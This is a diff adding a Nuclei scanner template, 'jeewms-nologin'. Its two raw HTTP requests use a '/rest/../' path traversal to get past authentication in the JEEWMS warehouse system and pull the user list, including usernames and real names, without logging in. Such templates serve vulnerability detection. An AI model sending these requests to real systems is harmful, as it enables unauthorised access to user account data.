@@ -1,0 +1,52 @@
+id: jeewms-nologin
+info:
+  name: jeewms-nologin
+  author: apple
+  severity: medium
+  description: description
+  reference:
+    - https://github.com/MrWQ/vulnerability-paper/blob/7551f7584bd35039028b1d9473a00201ed18e6b2/bugs/JEEWMS_%E4%BB%93%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96.md
+  tags: jeewms
+http:
+  - raw:
+      - |-
+        POST /wmstest/rest/../BiController.do?dayCount&reportType=line HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 0
+        Accept: */*
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Edg/85.0.564.63
+        X-Requested-With: XMLHttpRequest
+        Origin: {{Hostname}}
+        Referer: {{Hostname}}/wmstest/BiController.do?homebi
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5
+        Connection: close
+      - |-
+        POST /wmstest/rest/../userController.do?datagrid&field=id,userName,realName,userOrgList.tsDepart.departname,userKey,createBy,createDate,updateBy,updateDate,status, HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 58
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36 Edg/85.0.564.63
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        Origin: {{Hostname}}
+        Referer: {{Hostname}}/wmstest/userController.do?user&clickFunctionId=8a8ab0b246dc81120146dc8180df001f
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5
+        Connection: close
+
+        page=1&rows=10&sort=createDate%2CuserName&order=asc%2Cdesc
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'type'
+      - type: word
+        part: body
+        words:
+          - 'name'
+      - type: word
+        part: body
+        words:
+          - 'total'
